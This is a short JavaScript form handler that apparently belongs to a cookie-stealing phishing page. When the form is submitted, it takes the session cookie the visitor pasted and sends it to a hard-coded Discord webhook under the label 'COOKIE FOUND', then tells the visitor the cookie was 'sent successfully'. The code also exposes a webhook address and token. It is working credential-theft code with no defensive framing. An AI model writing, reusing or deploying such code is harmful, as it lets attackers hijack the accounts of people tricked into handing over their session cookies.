document.getElementById('cookieForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    var cookieInput = document.getElementById('cookieInput').value;
    var webhookUrl = 'https://discord.com/api/webhooks/1248830234979995731/npWs9EAjwbmXMczewQ6ka1WljVjSJyxcCxSzvvuLqhSJBRgge2MFT1WlhLntAInGmq_3';

    var message = {
        content: `COOKIE FOUND: ${cookieInput}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    }).then(response => {
        if(response.ok) {
            alert('Cookie sent successfully!');
        } else {
            alert('Failed to send cookie.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('An error occurred.');
    });
});
